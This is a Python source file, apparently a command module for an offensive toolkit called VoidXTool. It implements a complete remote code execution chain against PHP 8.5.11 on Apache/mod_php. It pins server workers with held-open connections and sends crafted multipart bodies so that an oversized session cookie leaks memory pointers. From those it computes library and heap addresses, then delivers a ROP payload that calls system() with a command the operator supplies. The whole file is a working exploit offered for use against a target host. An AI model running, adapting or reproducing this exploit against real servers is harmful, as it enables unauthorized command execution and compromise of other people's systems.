"""PHP2Shell RCE chain for PHP 8.5.11 apache/mod_php — integrated VoidXTool command.

Usage inside tool: php2shell <host> [port] [path] [--rce 'command']

Chains CVE-2026-109619 (session-state OOM disclosure) into
CVE-2026-109618 (incomplete-bucket RCE sink) against PHP 8.5.11 NTS
on Apache/mod_php prefork x86-64.  Recalibrate all offsets for any
other binary — see module docstring in 52704.py for full methodology.
"""

from __future__ import annotations

import argparse
import threading
import time
import tempfile
import socket
import struct
import sys
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path

from rich.console import Console
from rich.panel import Panel

from voidxtool.auth import Authentication
from voidxtool.commands.base import BaseCommand

console = Console()

# ── constants (exact PHP 8.5.11 / libphp build) ─────────────────────────────
DEFAULT_QUERY = (
    "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
    "&z=vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv"
)
MULTIPART_BOUNDARY = b"C" * 10
RCE_BOUNDARY       = b"AMP128BOUNDARY"
IS_OBJECT          = 8
DEFAULT_RCE_CMD    = "id>/var/www/html/proof.txt"
DEFAULT_PROOF_URL  = "/proof.txt"

# exact-build offsets — recalibrate for any other libphp binary
_DEFAULTS = dict(
    zval_ptr_dtor_offset = 0x7AE960,
    heap_from_lib_delta  = 0x3400000,
    rce_block_offset     = 0x5C400,
    rce_headers          = 402500,
    pivot_offset         = 0x6362AE,
    pop_rdi_offset       = 0x280D8D,
    pop_rsi_offset       = 0x2CBE07,
    ret_offset           = 0x280D8E,
    zif_system_offset    = 0x598650,
    forge_page           = 0x1E3,
    mid_pages            = 483,
    nested_fields        = 900,
    fake_len             = 0x1C000,
    pointer_floor        = 0x6F0000000000,
    a1_big               = 78,
    a1_fillers128        = 14,
    a1_burners           = 19,
    a1_burner_len        = 4000,
    a1_progress_len      = 4072,
)


# ── internal print with timestamps ───────────────────────────────────────────
def _log(*values: object) -> None:
    now   = time.time_ns()
    stamp = f"{now // 1_000_000_000}.{(now // 1_000) % 1_000_000:06d}"
    line  = " ".join(str(v) for v in values)
    console.print(f"[dim][{stamp}][/dim] {line}")


# ── body builders ─────────────────────────────────────────────────────────────
def _build_a1_body(path: Path, d: dict) -> None:
    parts, depth, key_pad, big_len = 860, 64, 90, 8000
    out = bytearray()

    def nested_name(i: int) -> bytes:
        return (("files[R%05d%s]" % (i, "K" * key_pad)).encode()
                + b"[a]" * (depth - 2))

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             content_type: bytes | None = None) -> None:
        out.extend(b"--" + MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if content_type is not None:
            out.extend(b"Content-Type: " + content_type + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"\x00")
    for i in range(parts):
        ct = (b"C" * 103 if i == 0 else b"C" * 231 if i == 1
              else b"application/octet-stream")
        out.extend(b"--" + MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + nested_name(i) + b"\"")
        out.extend(b"; filename=\"A\"" if i < 2 else b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ct + b"\r\n\r\n")
    for i in range(d["a1_fillers128"]):
        name = ("f%04d" % i).encode().ljust(103, b"x")[:103]
        part(name, b"v" * 8)
    for i in range(d["a1_big"]):
        part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(d["a1_burners"]):
        part(("u%02d" % i).encode(), b"U" * d["a1_burner_len"])
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * d["a1_progress_len"])
    out.extend(b"--" + MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    _log(f"A1 body={len(out)}")


def _leak_forge_fill_value(pages: int, page: int, fake_len: int,
                            index: int) -> bytes:
    length = pages * 4096 - 25
    value  = bytearray(b"A" * length)
    header = page * 0x1000 - 0x1018
    if 0 <= header and header + 0x20 <= length:
        struct.pack_into("<I", value, header,        0)
        struct.pack_into("<I", value, header + 4,    0x16)
        struct.pack_into("<Q", value, header + 8,    0)
        struct.pack_into("<Q", value, header + 0x10, fake_len)
        tag = (b"/" + ("%02d" % (index % 100)).encode() + b"BBBBB")
        value[header + 0x18:header + 0x20] = tag
    return bytes(value)


def _build_b1_body(path: Path, d: dict) -> None:
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + MULTIPART_BOUNDARY
                   + b"\r\nContent-Disposition: form-data; name=\""
                   + name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a")
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    index = 0
    for pages in [511] * 14 + [d["mid_pages"], 511]:
        value = _leak_forge_fill_value(pages, d["forge_page"],
                                       d["fake_len"], index)
        name  = ("f%04d" % index).encode().ljust(120, b"f")[:120]
        part(name, value)
        index += 1
    for _ in range(d["nested_fields"]):
        name = ("x%05d" % index).encode() + b"[a]" * 12
        part(name, b"v")
        index += 1
    out.extend(b"--" + MULTIPART_BOUNDARY + b"--\r\n")
    path.write_bytes(out)
    _log(f"B1 body={len(out)} fields={index}")


# ── RCE payload ───────────────────────────────────────────────────────────────
def _pack64(v: int) -> bytes: return struct.pack("<Q", v)
def _pack32(v: int) -> bytes: return struct.pack("<I", v)


def _build_rce_pad(heap: int, libphp: int, command: bytes, d: dict) -> bytes:
    if len(command) > 48:
        raise ValueError("command > 48 bytes")
    block        = heap  + d["rce_block_offset"]
    handlers     = block + 24 + 2000
    obj          = block + 24 + 2048
    execute_data = block + 24 + 2240
    cmd_string   = execute_data + 0x80
    return_value = block + 24 + 2464

    pivot      = libphp + d["pivot_offset"]
    pop_rdi    = libphp + d["pop_rdi_offset"]
    pop_rsi    = libphp + d["pop_rsi_offset"]
    ret        = libphp + d["ret_offset"]
    zif_system = libphp + d["zif_system_offset"]

    pad = bytearray(b"P" * 2528)
    pad[2000:2008] = _pack64(0)
    pad[2008:2016] = _pack64(pivot)
    pad[2016:2024] = _pack64(ret)

    o = 2048
    pad[o:o+4]       = _pack32(1)
    pad[o+4:o+8]     = _pack32(IS_OBJECT)
    pad[o+0x18:o+0x20] = _pack64(handlers)
    pad[o+0x40:o+0x48] = _pack64(pop_rdi)
    pad[o+0x48:o+0x50] = _pack64(execute_data)
    pad[o+0x50:o+0x58] = _pack64(pop_rsi)
    pad[o+0x58:o+0x60] = _pack64(return_value)
    pad[o+0x60:o+0x68] = _pack64(ret)
    pad[o+0x68:o+0x70] = _pack64(zif_system)

    o = 2240
    pad[o+0x10:o+0x18] = _pack64(return_value)
    pad[o+0x2C:o+0x30] = _pack32(1)
    pad[o+0x50:o+0x58] = _pack64(cmd_string)
    pad[o+0x58:o+0x5C] = _pack32(6)

    o += 0x80
    pad[o:o+4]           = _pack32(1)
    pad[o+4:o+8]         = _pack32(0x106)
    pad[o+0x10:o+0x18]   = _pack64(len(command) - 1)
    pad[o+0x18:o+0x18+len(command)] = command

    pad[1928:1936] = _pack64(obj)
    pad[1936:1940] = _pack32(IS_OBJECT | 0x100)
    return bytes(pad)


def _build_rce_body(d: dict, heap: int, libphp: int, command: str) -> bytes:
    pad      = _build_rce_pad(heap, libphp, command.encode() + b"\x00", d)
    key_size = 80000
    body     = bytearray()

    def field(name: bytes, value: bytes) -> bytes:
        return (b"--" + RCE_BOUNDARY
                + b"\r\nContent-Disposition: form-data; name=\"" + name
                + b"\"\r\n\r\n" + value + b"\r\n")

    def large_key(i: int) -> bytes:
        return b"X" * (key_size - 16) + ("%016d" % i).encode()

    body += field(b"memshift", b"M" * 40000)
    for i in range(30):
        body += field(b"a[" + large_key(i) + b"][c]", b"v")
    body += field(b"pad", pad)
    body += field(b"pad", b"x")
    for i in range(30, 45):
        body += field(b"a[" + large_key(i) + b"][c]", b"v")
    final = b"a[" + large_key(45) + b"][c]"
    body += b"--" + RCE_BOUNDARY + b"\r\n"
    body += b"X: a\r\n" * d["rce_headers"]
    body += (b"Content-Disposition: form-data; name=\"" + final
             + b"\"\r\n\r\nv\r\n--" + RCE_BOUNDARY + b"--\r\n")
    return bytes(body)


# ── worker / holder infrastructure ───────────────────────────────────────────
@dataclass
class _Holder:
    sock: socket.socket
    feeding: bool = True
    lock: threading.Lock = field(default_factory=threading.Lock)
    def __getattr__(self, name: str) -> object:
        return getattr(self.sock, name)


def _close_holder(h: _Holder) -> None:
    with h.lock:
        h.feeding = False
        try: h.sock.shutdown(socket.SHUT_RDWR)
        except OSError: pass
        h.sock.close()


def _open_holder(host: str, port: int, path: str, timeout: float = 30.0) -> _Holder:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(
        b"POST " + path.encode() + b" HTTP/1.1\r\nHost: x\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n"
        b"Expect: 100-continue\r\n\r\n"
    )
    buf = bytearray()
    while b"\r\n\r\n" not in buf and len(buf) < 8192:
        chunk = sock.recv(8192)
        if not chunk: break
        buf.extend(chunk)
    if b" 100 Continue\r\n" not in buf:
        sock.close()
        raise RuntimeError(f"holder not accepted: {bytes(buf[:80])!r}")
    sock.sendall(b"1\r\nx\r\n")
    return _Holder(sock)


def _keep_alive(holders: list[_Holder], stop: threading.Event) -> None:
    block = b"400\r\n" + b"x" * 1024 + b"\r\n"
    while not stop.wait(1.0):
        for h in tuple(holders):
            try:
                with h.lock:
                    if h.feeding: h.sock.sendall(block)
            except OSError: pass


def _read_cl_response(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    buf = bytearray()
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk: raise ConnectionError("closed before headers")
        buf.extend(chunk)
        if len(buf) > 65536: raise RuntimeError("oversized headers")
    head, body = bytes(buf).split(b"\r\n\r\n", 1)
    cl = None
    for line in head.split(b"\r\n")[1:]:
        n, s, v = line.partition(b":")
        if s and n.lower() == b"content-length":
            cl = int(v.strip()); break
    if cl is None: raise RuntimeError("no Content-Length")
    while len(body) < cl:
        chunk = sock.recv(min(65536, cl - len(body)))
        if not chunk: raise ConnectionError("closed during body")
        body += chunk
    return head + b"\r\n\r\n" + body


def _release_holder(h: _Holder, host: str, port: int,
                     path: str, timeout: float) -> None:
    with h.lock:
        h.feeding = False
        h.sock.sendall(b"0\r\n\r\n")
    r1 = _read_cl_response(h.sock, timeout)
    if not r1.startswith(b"HTTP/1.1 200"):
        raise RuntimeError(f"release failed: {r1[:60]!r}")
    h.sock.sendall(
        b"GET " + path.encode() + b" HTTP/1.1\r\nHost: "
        + host.encode() + b":" + str(port).encode()
        + b"\r\nConnection: close\r\n\r\n"
    )
    _read_cl_response(h.sock, timeout)
    h.sock.settimeout(timeout)
    while h.sock.recv(4096): pass
    h.sock.close()


def _discover_pool(host: str, port: int, path: str,
                   holders: list[_Holder], max_w: int) -> int:
    misses = 0
    while len(holders) < max_w:
        try:
            holders.append(_open_holder(host, port, path, 5.0))
        except TimeoutError:
            misses += 1
            if misses >= 2: break
            time.sleep(1.0); continue
        misses = 0
        if len(holders) % 25 == 0:
            _log(f"[*] holders {len(holders)} (auto)")
    if not holders or misses < 2:
        raise RuntimeError("worker discovery failed")
    _log(f"[+] MaxRequestWorkers={len(holders)}")
    return len(holders)


def _scrub_pool(holders: list[_Holder], host: str, port: int,
                path: str, timeout: float) -> None:
    batch = list(holders); holders.clear()
    errors = []
    def release(h: _Holder) -> str | None:
        try: _release_holder(h, host, port, path, timeout); return None
        except (OSError, RuntimeError) as exc: _close_holder(h); return str(exc)
    with ThreadPoolExecutor(max_workers=len(batch)) as pool:
        for fut in as_completed([pool.submit(release, h) for h in batch]):
            err = fut.result()
            if err: errors.append(err)
    _log(f"[*] scrubbed {len(batch)} early_closes={len(errors)}")


def _repin_parallel(host: str, port: int, path: str,
                    n: int, holders: list[_Holder]) -> None:
    opened: list[_Holder] = []
    try:
        with ThreadPoolExecutor(max_workers=n) as pool:
            for fut in as_completed(
                [pool.submit(_open_holder, host, port, path, 30.0)
                 for _ in range(n)]
            ):
                opened.append(fut.result())
    except BaseException:
        for h in opened: _close_holder(h)
        raise
    holders.extend(opened)


@dataclass
class _ChunkedJob:
    thread: threading.Thread
    errors: list[BaseException]


def _start_chunked(host: str, port: int, path: str,
                   body: Path, resp: Path, timeout: float) -> _ChunkedJob:
    errors: list[BaseException] = []

    def send() -> None:
        received = bytearray(); sock = None
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            sock.sendall(
                b"POST " + path.encode() + b" HTTP/1.1\r\nHost: "
                + host.encode() + b":" + str(port).encode()
                + b"\r\nContent-Type: multipart/form-data; boundary="
                + MULTIPART_BOUNDARY
                + b"\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
            )
            with body.open("rb") as f:
                while True:
                    piece = f.read(65536)
                    if not piece: break
                    sock.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            sock.sendall(b"0\r\n\r\n")
            while len(received) < 4 << 20:
                chunk = sock.recv(65536)
                if not chunk: break
                received.extend(chunk)
        except OSError as exc:
            if sock is None: errors.append(exc)
        finally:
            if sock: sock.close()
            resp.write_bytes(received)

    t = threading.Thread(target=send, daemon=True)
    t.start()
    return _ChunkedJob(t, errors)


def _finish_chunked(job: _ChunkedJob, resp: Path, timeout: float) -> bytes:
    job.thread.join(timeout)
    if job.thread.is_alive(): raise TimeoutError("chunked timeout")
    if job.errors: raise job.errors[0]
    return resp.read_bytes()


def _http_exchange(host: str, port: int, request: bytes, timeout: float) -> bytes:
    buf = bytearray()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        sock.sendall(request)
        while True:
            data = sock.recv(65536)
            if not data: break
            buf.extend(data)
        sock.close()
    except OSError: pass
    return bytes(buf)


def _cookie_value(response: bytes) -> bytes:
    marker = b"Set-Cookie: PHPSESSID="
    i = response.find(marker)
    if i < 0: return b""
    return response[i + len(marker):].split(b"\r\n", 1)[0]


def _summarize_cookie(encoded: bytes, pointer_floor: int) -> dict:
    decoded  = urllib.parse.unquote_to_bytes(encoded.decode("latin1"))
    pointers = Counter()
    for off in range(0, len(decoded) - 7, 8):
        v = struct.unpack_from("<Q", decoded, off)[0]
        if pointer_floor <= v <= 0x7FFFFFFFFFFF:
            pointers[v] += 1
    return {"decoded": decoded, "pointers": pointers,
            "top": pointers.most_common(20)}


def _amplified_rce(host: str, port: int, path: str,
                   d: dict, heap: int, libphp: int,
                   command: str, proof_url: str | None) -> bool | None:
    body    = _build_rce_body(d, heap, libphp, command)
    request = (
        b"POST " + path.encode() + b" HTTP/1.1\r\nHost: v\r\n"
        b"Content-Type: multipart/form-data; boundary=" + RCE_BOUNDARY
        + b"\r\nContent-Length: " + str(len(body)).encode()
        + b"\r\nConnection: close\r\n\r\n" + body
    )
    response = _http_exchange(host, port, request, 30.0)
    first    = response.split(b"\r\n", 1)[0] if response else b"<no response>"
    _log(f"[*] rce resp={len(response)} first={first!r}")
    if proof_url is None: return None
    time.sleep(0.5)
    proof = _http_exchange(
        host, port,
        b"GET " + proof_url.encode()
        + b" HTTP/1.1\r\nHost: v\r\nConnection: close\r\n\r\n",
        5.0,
    )
    _, _, content = proof.partition(b"\r\n\r\n")
    if b"uid=" in content:
        _log(f"[+] RCE confirmed: {content.decode('utf-8','replace').strip()}")
        return True
    _log("[-] no proof")
    return False


# ── VoidXTool command ─────────────────────────────────────────────────────────
class PHP2ShellCommand(BaseCommand):
    """CVE-2026-109618/109619 PHP2Shell RCE chain against PHP 8.5.11/mod_php."""

    def __init__(self) -> None:
        super().__init__("php2shell")
        self.host    = ""
        self.port    = 80
        self.path    = "/index.php"
        self.rce_cmd: str | None = None
        self.d       = dict(_DEFAULTS)

    def custom_validate_arguments(self, user_arguments: list) -> bool:
        self.host = str(user_arguments[0]).strip()
        try:
            self.port = int(user_arguments[1]) if len(user_arguments) > 1 else 80
        except ValueError:
            console.print("[red]Port must be numeric.[/red]")
            return False
        if not 1 <= self.port <= 65535:
            console.print("[red]Port out of range.[/red]")
            return False
        self.path = str(user_arguments[2]) if len(user_arguments) > 2 else "/index.php"
        if not self.path.startswith("/"): self.path = "/" + self.path
        self.rce_cmd = str(user_arguments[3]) if len(user_arguments) > 3 else DEFAULT_RCE_CMD
        return True

    def run(self, arguments: list, authentication: Authentication) -> bool:
        del authentication
        if not self.validate_arguments(arguments):
            return False

        console.print(Panel(
            f"Target: [bold cyan]{self.host}:{self.port}{self.path}[/bold cyan]\n"
            f"RCE cmd: [yellow]{self.rce_cmd}[/yellow]",
            title="[bold bright_magenta]PHP2SHELL — CVE-2026-109618/109619[/bold bright_magenta]",
            border_style="bright_cyan",
        ))

        holders:      list[_Holder]  = []
        holder_stop   = threading.Event()
        holder_thread = threading.Thread(
            target=_keep_alive, args=(holders, holder_stop), daemon=True)
        holder_thread.start()

        try:
            eff = _discover_pool(self.host, self.port, self.path, holders, 512)
            _scrub_pool(holders, self.host, self.port, self.path, 30.0)
            _repin_parallel(self.host, self.port, self.path, eff, holders)
            _log(f"[+] repinned pool={eff}")

            with tempfile.TemporaryDirectory(prefix="php2shell-") as tmp_s:
                tmp = Path(tmp_s)
                a1, a1_resp = tmp / "a1.bin", tmp / "a1.resp"
                b1, b1_resp = tmp / "b1.bin", tmp / "b1.resp"
                _build_a1_body(a1, self.d)
                _build_b1_body(b1, self.d)

                old  = holders.pop()
                rebound = None
                for attempt in range(1, 3):
                    try: _release_holder(old, self.host, self.port, self.path, 15.0)
                    except (OSError, RuntimeError) as exc:
                        _close_holder(old); _log(f"[*] rebind probe: {exc}")
                    rebound = _open_holder(self.host, self.port, self.path, 30.0)
                    _log(f"[*] rebind attempt={attempt} port={rebound.getsockname()[1]}")
                    if attempt == 1: old = rebound
                assert rebound is not None
                holders.append(rebound)

                a1_job = _start_chunked(self.host, self.port,
                                        self.path + DEFAULT_QUERY,
                                        a1, a1_resp, 180.0)
                time.sleep(0.25)
                b1_job = _start_chunked(self.host, self.port,
                                        self.path, b1, b1_resp, 600.0)
                time.sleep(0.05)
                released = holders.pop()
                _close_holder(released)
                _log("[*] released rebound holder into A1/B1 queue")

                _finish_chunked(a1_job, a1_resp, 200.0)
                response = _finish_chunked(b1_job, b1_resp, 630.0)

                encoded = _cookie_value(response)
                _log(f"[*] encoded cookie={len(encoded)}")
                if not encoded:
                    console.print("[red][-] No Set-Cookie PHPSESSID — disclosure failed.[/red]")
                    return False

                result   = _summarize_cookie(encoded, self.d["pointer_floor"])
                decoded  = result["decoded"]
                pointers = result["pointers"]
                _log(f"[*] decoded={len(decoded)} candidates={len(pointers)}")
                for val, cnt in result["top"]:
                    _log(f"    {val:#014x} count={cnt}")

                if len(decoded) <= 256:
                    console.print("[red][-] Cookie too short — normal size, no leak.[/red]")
                    return False

                if not pointers:
                    console.print("[red][-] No pointer candidates in cookie.[/red]")
                    return False

                dominant, count = pointers.most_common(1)[0]
                libphp = dominant - self.d["zval_ptr_dtor_offset"]
                buckets: Counter = Counter()
                for v, vc in pointers.items():
                    buckets[v & ~0x1FFFFF] += vc
                _log(f"[+] dominant={dominant:#x} count={count} libphp={libphp:#x}")
                console.print("[bold green][+] Overlong Set-Cookie disclosure reproduced.[/bold green]")

                if count < 100 or libphp & 0x1FFFFF:
                    console.print("[red][-] Pointer profile mismatch — wrong binary.[/red]")
                    return False

                heap = libphp + self.d["heap_from_lib_delta"]
                if not buckets.get(heap):
                    console.print("[red][-] Derived main chunk absent from leak — miscalibrated.[/red]")
                    return False

                _log(f"[+] heap={heap:#x} (libphp+{self.d['heap_from_lib_delta']:#x})")
                time.sleep(0.2)

                proof_url = DEFAULT_PROOF_URL if self.rce_cmd == DEFAULT_RCE_CMD else None
                ok = _amplified_rce(self.host, self.port, self.path,
                                    self.d, heap, libphp,
                                    self.rce_cmd, proof_url)
                if ok is False:
                    console.print("[red][-] RCE stage failed.[/red]")
                    return False
                if ok:
                    console.print("[bold green][+] CVE-2026-109618/109619 chain succeeded — RCE confirmed.[/bold green]")
                else:
                    console.print("[yellow][?] Payload delivered — execution unverified.[/yellow]")
                return True

        finally:
            holder_stop.set()
            holder_thread.join(timeout=2)
            for h in holders:
                try: h.sock.close()
                except OSError: pass
